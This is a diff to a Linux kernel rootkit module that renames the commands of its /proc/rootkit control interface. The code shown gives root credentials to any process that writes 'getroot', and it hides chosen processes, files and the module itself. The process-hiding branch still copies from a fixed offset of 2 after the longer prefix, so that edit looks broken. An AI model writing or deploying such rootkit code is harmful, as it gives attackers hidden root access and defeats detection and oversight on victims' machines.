@@ -138,12 +138,12 @@ static ssize_t rootkit_read(struct file *file, char __user *buff, size_t count, 
 "RTKIT\n\
 DESC:\n\
   hides files prefixed with __rt or 10-__rt and gives root\n\
-  How to use: echo cmd > /proc/rootkit
+  How to use: echo cmd > /proc/rootkit \n\
 CMDS:\n\
   getroot - uid and gid 0 for writing process\n\
-  hidep-XXXX - hides proc with id XXXX\n\
-  unhidep - unhides last process\n\
-  hidef - toogles file hiding\n\
+  hideproc-XXXX - hides proc with id XXXX\n\
+  unhideproc - unhides last process\n\
+  hidefile - toogles file hiding\n\
   mh - module hide\n\
   ms - module show\n\
 STATUS\n\
@@ -173,11 +173,11 @@ static ssize_t rootkit_write(struct file *file, const char __user *buff, size_t 
 		(credentials->uid).val = (credentials->euid).val = 0;
 		(credentials->gid).val = (credentials->egid).val = 0;
 		commit_creds(credentials);
-	} else if (!strncmp(kernel_buff, "hidep-", MIN(6, count))) {//upXXXXXX hides process with given id
+	} else if (!strncmp(kernel_buff, "hideproc-", MIN(9, count))) {//upXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) copy_from_user(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
-	} else if (!strncmp(kernel_buff, "unhidep", MIN(7, count))) {//unhides last hidden process
+	} else if (!strncmp(kernel_buff, "unhideproc", MIN(10, count))) {//unhides last hidden process
 		if (current_pid > 0) current_pid--;
-	} else if (!strncmp(kernel_buff, "hidef", MIN(5, count))) {//toggles hide files in fs
+	} else if (!strncmp(kernel_buff, "hidefile", MIN(8, count))) {//toggles hide files in fs
 		hide_files = !hide_files;
 	} else if (!strncmp(kernel_buff, "mh", MIN(2, count))) {//module hide
 		module_hide();
